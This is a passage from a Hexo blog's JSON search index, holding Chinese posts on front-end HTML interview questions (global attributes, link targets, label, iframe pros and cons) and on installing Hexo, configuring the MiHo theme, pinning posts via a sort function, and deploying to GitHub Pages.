(媒体元素，比如一些视频，图片等)&lt;datalist&gt;&lt;/datalist&gt;(选项列表，与 input 元素配合使用，来定义 input 可能的值)&lt;details&gt;&lt;/details&gt; (用于描述文档或文档某个部分的细节,默认属性为open,配合 summary 一起使用) 五、HTML全局属性(global attribute)有哪些? 1）MDN: html global attribute或W3C HTML global-attributes； 2）accesskey:规定激活元素的快捷键； 3）class:为元素设置类标识，多个类名用空格分开，CSS和javascript可通过class属性获取元素； 4）contenteditable: 指定元素内容是否可编辑； 5）contextmenu: 自定义鼠标右键弹出菜单内容； 6）translate: 规定是否应该翻译元素内容； 7）dir: 规定元素中内容的文本方向； 8）draggable: 设置元素是否可拖拽； 9）dropzone: 规定在拖动或被拖动数据时是否进行复制、移动或链接； 10）hidden: 样式上会导致元素不显示，但是不能用这个属性实现样式效果； 11）id: 元素id，文档内唯一； 12）lang: 元素内容的的语言； 13）spellcheck: 是否启动拼写和语法检查； 14）style: 行内css样式； 15）tabindex: 设置元素可以获得焦点，通过tab可以导航； 16）title: 元素相关的建议信息； 17）data-*: 在标准内，允许于HTML元素中存储额外的信息，而不需要使用类似于classList；在标准外属性，data-常用来设置一些自定义属性，存放一些数据信息，方便JavaScript的处理等，这些属性集可以通过对象的dataset属性获取，不支持dataset属性的浏览器可以通过getAttribute方法获取（驼峰风格）。所有主流浏览器都支持 data-* 属性。 六、超链接target属性的取值和作用？ target这个属性指定所链接的页面在浏览器窗口中的打开方式。 它的参数值主要有： a、 _blank ：在新浏览器窗口中打开链接文件 b、 _parent ：将链接的文件载入含有该链接框架的父框架集或父窗口中。如果含有该链接的框架不是嵌套的，则在浏览器全屏窗口中载入链接的文件，就像 _self 参数一样。 c、 _self ：在同一框架或窗口中打开所链接的文档。此参数为默认值，通常不用指定。 d、 _top ：在当前的整个浏览器窗口中打开所链接的文档，因而会删除所有框架。 七、Label的作用是什么，怎么用？ 定义表单控制间的关系 , 当用户选择该标签时，浏览器会自动将焦点转到和标签相关的表单控件上。 1234&lt;label for='Name'&gt;Number:&lt;/label&gt;&lt;input type=“ text “ name='Name' id='Name'/&gt; //注意label的for属性值要与后面对应的input标签id属性值相同&lt;label&gt;Date:&lt;input type='text' name='B'/&gt;&lt;/label&gt; 八、Iframe的优点和缺点？ 优点： 1.）iframe能够原封不动的把嵌入的网页展现出来。 2.）多个网页引用iframe只需要修改iframe的内容，就可以实现调用的每一个页面内容的更改，方便快捷。 3.）网页如果为了统一风格，头部和版本都是一样的，就可以写成一个页面，用iframe来嵌套，可以增加代码的可重用。 4.）如果遇到加载缓慢的第三方内容如图标和广告，这些问题可以由iframe来解决。 5.）重载页面时不需要重载整个页面，只需要重载页面中的一个框架页(减少了数据的传输，增加了网页下载速度)。 缺点： 1.）iframe会阻塞主页面的 Onload 事件； 2.）搜索引擎的检索程序无法解读这种页面，不利于 SEO（搜索引擎优化）; 3.）iframe和主页面共享连接池，而浏览器对相同域的连接有限制，所以会影响页面的并行加载； 4.）会产生很多页面，不容易管理； 5.）不容易打印 6.）浏览器的后退按钮无效 7.）多数小型的移动设备（PDA 手机）无法完全显示框架，设备兼容性差 8.）多框架的页面会增加服务器的http请求，对于大型网站是不可取的。 如果需要使用iframe，最好是通过javascript，动态给iframe添加 src 属性值。 现在基本上都是用Ajax来代替iframe，所以iframe已经渐渐的退出了前端开发。 标注： 本文来自牛客网","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-考题","slug":"前端-考题","permalink":"http://liuxuewen-site.github.io/tags/前端-考题/"}]},{"title":"Hexo文章置顶的方法","slug":"Hexo-bs-articleTop","date":"2018-01-28T16:00:00.000Z","updated":"2018-07-03T17:01:33.526Z","comments":true,"path":"2018/01/29/Hexo-bs-articleTop/","link":"","permalink":"http://liuxuewen-site.github.io/2018/01/29/Hexo-bs-articleTop/","excerpt":"","text":"Hexo 默认只提供了按发布日期的降序来排序，通过在 Hexo github 的 issue 里找到了解决办法，原理：在 Hexo 生成首页 HTML 时，将 top 值高的文章排在前面，达到置顶功能，以下解决方法在Hexo 3.3.6 上修改相关文件。 一、修改 Hexo 文件夹下的 node_modules/hexo-generator-index/lib/generator.js文件 找到该文件后，添加以下代码： 1234567891011posts.data = posts.data.sort(function(first, second) &#123; if (first.top &amp;&amp; second.top) &#123; // 两篇文章top都有定义 return first.top == second.top ? second.date - first.date : second.top - first.top //若top值一样则按照文章日期降序排, 否则按照top值降序排 &#125; else if (first.top &amp;&amp; !second.top) &#123; // 以下是只有一篇文章top有定义，将有top的排在前面 return -1; &#125; else if (!first.top &amp;&amp; second.top) &#123; return 1; &#125; else &#123; return second.date - first.date; // 都没定义top，按照文章日期降序排 &#125;&#125;); 更改后的完整代码如下： 123456789101112131415161718192021222324252627'use strict';var pagination = require('hexo-pagination');module.exports = function(locals) &#123; var config = this.config; var posts = locals.posts.sort(config.index_generator.order_by); posts.data = posts.data.sort(function(first, second) &#123; if (first.top &amp;&amp; second.top) &#123; // 两篇文章top都有定义 return first.top == second.top ? second.date - first.date : second.top - first.top //若top值一样则按照文章日期降序排, 否则按照top值降序排 &#125; else if (first.top &amp;&amp; !second.top) &#123; // 以下是只有一篇文章top有定义，将有top的排在前面 return -1; &#125; else if (!first.top &amp;&amp; second.top) &#123; return 1; &#125; else &#123; return second.date - first.date; // 都没定义top，按照文章日期降序排 &#125; &#125;); var paginationDir = config.pagination_dir || 'page'; var path = config.index_generator.path || ''; return pagination(path, posts, &#123; perPage: config.index_generator.per_page, layout: ['index', 'archive'], format: paginationDir + '/%d/', data: &#123; __index: true &#125; &#125;);&#125;; 不同版本的 Hexo 代码可能有些区别；添加的代码跟版本无关。 二、在需要置顶的文章的 front-matter 中添加 top 值 top 值越大，文章越靠前，举例如下： 123456789title: miho-主题安装和配置详情date: 2017-08-01categories: 开源项目author: MinHowtags: - 博客 - 开源项目cover_picture: https://cloud.minhow.com/images/miho/theme/github-second.jpgtop: 1 标注： 参考资料1：https://blog.minhow.com/2017/08/20/hexo/article-top/","categories":[{"name":"hexo","slug":"hexo","permalink":"http://liuxuewen-site.github.io/categories/hexo/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"http://liuxuewen-site.github.io/tags/hexo/"}]},{"title":"MiHo-主题安装和配置详情","slug":"Hexo-bs-installation","date":"2018-01-27T16:00:00.000Z","updated":"2019-01-25T09:49:05.137Z","comments":true,"path":"2018/01/28/Hexo-bs-installation/","link":"","permalink":"http://liuxuewen-site.github.io/2018/01/28/Hexo-bs-installation/","excerpt":"","text":"一. 主题简介&emsp;&emsp;MiHo 是一款单栏响应式的Hexo主题；基于 Hexo 3.0+ 制作，兼容移动端浏览；主题的代码托管在GitHub上，欢迎Star和Fork；如遇到问题或发表建议，可以提Issues，也可以在博客中留言给我，另外,喜欢的话不妨给个 Star。 二. 安装2.1 安装主题 1$ git clone https://github.com/WongMinHo/hexo-theme-miho.git themes/miho MiHo 主题需要Hexo 3.0或以上版本，请先升级。 2.2 更新 12cd themes/mihogit pull 2.3 依赖安装 如下依赖如果已经安装，请看配置介绍。 Json-content 生成站点文章静态数据，用于站内搜索。 1npm install hexo-generator-json-content --save 三. 站点配置站点配置文件_config.yml在hexo根目录下。 3.1 启用主题 1`theme: miho` 3.2 网站基本配置 以下配置是站点的全局配置，更多配置，请查看 123456title: MinHow's Blogsubtitle: 网站副标题description: 专注 WEB 开发的技术博客author: MinHowlanguage: 网站使用的语言timezone: 网站时区 3.3 jsonContent配置 详细的配置请查看hexo-generator-json-content 123456789101112131415161718jsonContent: meta: false pages: false posts: title: true date: true path: true text: false raw: false content: false slug: false updated: false comments: false link: false permalink: false excerpt: false categories: false tags: false 四. 主题配置编辑主题配置文件，themes/miho/_config.yml。 4.1 属性 下面将介绍几个比较重要的配置。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122# hexo-theme-miho# https://github.com/wongminho/hexo-theme-miho# Favicon of your site | 网站iconfavicon: /favicon.ico# Header# Keywords of your site | 网站关键字keywords: MinHow,MinHow's Blog# Head headline | 头部标题header_title: MinHow's Blog# Head description | 头部描述header_description: 一个专注 WEB 开发的技术博客# Link to your logo | logo地址logo: images/logo.png# Link to your banner_img | 首页banner图地址banner_img: images/banner.jpg# Menu setting | 菜单设置# name: Font Awesome icon | Font Awesome 图标# title: Home Title | 标题# url: //minhow.com Url, absolute or relative path | 链接，绝对或相对路径# target: true Whether to jump out | 是否跳出menu: home: title: Home url: / target: false archive: title: Archives url: /archives target: false user: title: About url: /about target: false# Social setting, use to display social information | 社交设置，用来展示社交信息# name: Font Awesome icon | Font Awesome 图标# title: Home Icon title | 图标标题# url: //minhow.com Url, absolute or relative path | 链接，绝对或相对路径# target: true Whether to jump out | 是否跳出social: home: title: MinHow url: //minhow.com target: true github: title: Github url: //github.com/wongminho target: true weibo: title: Weibo url: //weibo.com/WongMinHo target: true twitter: title: Twitter url: //twitter.com/huangminhow target: true #qq: #weixin: #snapchat: #telegram: #mail: #facebook: #google: #linkedin:# Content# Excerpt length | 摘录长度excerpt_length: 190# Excerpt link | 摘录链接excerpt_link: more&gt;&gt;# New window open link | 新窗口打开文章open_new_link: false# Article default cover picture，size：350*150 | 文章默认封面图，尺寸：350*150cover_picture: images/banner.jpg# Open background particles | 开启背景粒子open_bg_particle: true# Open animation in homepage and head | 开启主页及头部动画open_animation: true# Article# Open toc | 是否开启toctoc: true# Open share | 是否开启分享share: true# Style customization | 样式定制style: # Main color tone | 主色调 main_color: '#0cc'# Comments | 评论# 畅言，输入appid和appkeychangyan_appid: falsechangyan_appkey: false# 友言，输入idyouyan_id: false# disqusdisqus: false# Analytics | 分析# 站长分析，输入站点idcnzz_analytics: false# 百度分析，输入key值baidu_analytics: false# google analytics | google分析google_analytics: false# Footer# Access statistics | “不蒜子”访问量统计access_counter: on: true site_uv: 总访客数： site_pv: 总访问量：# Copyright Information | 版权信息copyright: 2017 MinHow 4.2 文章封面图 文章默认封面图，尺寸：350*150，当文章基本配置没有cover_picture时才显示。 1cover_picture: images/banner.jpg 4.3 开启背景粒子 是否开启背景粒子。 1open_bg_particle: true 4.4 开启主页及头部动画 是否开启主页及头部动画。 1open_animation: true 4.5 评论 支持畅言、disqus。 1234567# 畅言，输入appid和appkeychangyan_appid: falsechangyan_appkey: false# 友言，输入idyouyan_id: false# disqusdisqus: false 4.6 数据统计 支持站长、百度、google三种数据统计，正确填写配置信息即可。 123456# 站长分析，输入站点idcnzz_analytics: false# 百度分析，输入key值baidu_analytics: false# google分析google_analytics: false 4.7 文章基本配置 123456789101112---title: Hello Worlddate: 2017-06-18categories: Firstauthor: MinHowtags: - First - Secondcover_picture: /images/banner.jpg--- MinHow-This is a summary&lt;!-- more --&gt; 说明： 需要注意tags和摘要的写法，不然首页不能正确显示标签和摘要； cover_picture文章封面图，不填默认显示_config.yml配置的图片。 标注： 参考资料1：https://blog.minhow.com/2017/08/01/blog/installation-configuration/","categories":[{"name":"hexo","slug":"hexo","permalink":"http://liuxuewen-site.github.io/categories/hexo/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"http://liuxuewen-site.github.io/tags/hexo/"}]},{"title":"Hello Hexo","slug":"Hexo-bs-helloHexo","date":"2018-01-26T16:00:00.000Z","updated":"2018-07-03T17:02:54.161Z","comments":true,"path":"2018/01/27/Hexo-bs-helloHexo/","link":"","permalink":"http://liuxuewen-site.github.io/2018/01/27/Hexo-bs-helloHexo/","excerpt":"Welcome to Hexo ! 使用hexo，按照下面的流程，你将能快速地，创建出一个属于自己的个人博客. 一、创建Github 域名和空间1.1 注册 首先你需要注册一个 Github 账号，已有的可以下翻去1.2 创建仓库，注意username，这会影响到你的域名，你的域名将会是 username.github.io ，所以认真的取个名字吧。","text":"Welcome to Hexo ! 使用hexo，按照下面的流程，你将能快速地，创建出一个属于自己的个人博客. 一、创建Github 域名和空间1.1 注册 首先你需要注册一个 Github 账号，已有的可以下翻去1.2 创建仓库，注意username，这会影响到你的域名，你的域名将会是 username.github.io ，所以认真的取个名字吧。 1.2 创建仓库 然后需要创建一个仓库(repository) 来存储我们的网站，点击首页加号的 New repository按钮创建仓库, Respository name 必须为username.github.io （username 一定与前面的Owner 一致），记住你的username下面会用到。 二、安装 Hexo 可以说是目前最流行的博客框架了，基于Nodejs，更多信息可以google，下面需要安装的工具包括 Git，Nodejs，Hexo。（Windows 用户自行搜索这些工具，直接安装即可，试过基本没啥问题） 2.1 安装Git 此处不做说明，请自行百度 2.2 安装Node.js 此处不做说明，请自行百度（安装node.js时已经包含安装了npm） 2.3 安装Hexo 以上所有都安装完成之后再安装Hexo，桌面右键点击Git Bash Here，输入 1$ sudo npm install hexo-cli -g 至此，所有必须工具已经安装完成，下面我们就可以生成博客，上传至我们的Github 仓库了。 三、 编写，发布 接下来我们需要用Hexo初始化一个博客，然后更改一些自定义的配置，或者加上自己喜欢的主题，写上第一篇文章，然后发布到自己的个人Github网站(username.github.io)。 3.1 创建博客 选取一个目录，右键点击Git Bash Here，输入以下代码，执行成功后，会创建出一个名为 username.github.io 的文件夹。（此处文件名可以自定） 1$ hexo init username.github.io 3.2 更改配置主题安装 为了使博客不太难看，我们需要安装一个主题，切换至刚刚生成的Hexo 目录，安装主题 12$ cd username.github.io$ git clone https://github.com/iissnan/hexo-theme-next themes/next 这里选了一个极简的主题，也是Hexo众多主题中最受欢迎的一个。上面出现的喵神的主题 在 这里 。这里有更多的 hexo主题 供你选择。 基础配置 打开文件位置username.github.io/_config.yml,修改几个键值对，下面把几个必须设置的列出来按需求修改，记得保存， 还有注意配置的键值之间一定要有空格。更多设置 … 1234567title: dimsky 的 9 维空间 //你博客的名字author: dimsky //你的名字language: zh-Hans //语言 中文theme: next //刚刚安装的主题名称deploy:type: git //使用Git 发布repo: https://github.com/username/username.github.io.git // 刚创建的Github仓库 主题配置 主题配置文件在username.github.io/themes/next/_config.yml中修改，这里略过。设置详情 …（不同的主题配置不一样） 3.3 写文章 所有基础框架都已经创建完成，接下来可以开始写你的第一篇博客了 在username.github.io/source/_posts下创建你的第一个博客，例如，创建一个名为FirstNight.md的文件，用Markdown语法大肆发挥吧，注意保存。也可以在hexo目录下，用下面命令创建新文章： 1$ hexo new FirstNight 文章如： 1234---title: First Night---&gt; 我有一头**小毛驴**，可是我从来都不骑。 3.4 测试 1$ hexo s 测试服务启动，你可以在浏览器中输入https://localhost:4000 访问了。 3.5 安装hexo-deployer-git自动部署发布工具 1$ npm install hexo-deployer-git --save 3.6 发布 测试没问题后，我们就生成静态网页文件发布至我们的Github pages 中。 1$ hexo clean &amp;&amp; hexo g &amp;&amp; hexo d hexo clean（清除缓存文件 (db.json) 和已生成的静态文件 (public)）， hexo g（生成静态文件），hexo d（部署网站） 如果这是你的第一次，终端会让你输入Github 的邮箱和密码，正确输入后，片刻就会把你的博客上传至Github 了。以后在每次把博客写完后，执行一下这个命令就可以直接发布了。 3.7 结束 你的博客已经完成了，在浏览器中输入 username.github.io (github博客项目名称即为域名) 就能够访问了。 （发布上GitHub上的博客，当我们本地增删改后，用3.6重新发布后，会同步。） 标注： 参考资料1：https://www.jianshu.com/p/4eaddcbe4d12","categories":[{"name":"hexo","slug":"hexo","permalink":"http://liuxuewen-site.github.io/categories/hexo/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"http://liuxuewen-site.github.io/tags/hexo/"}]}]}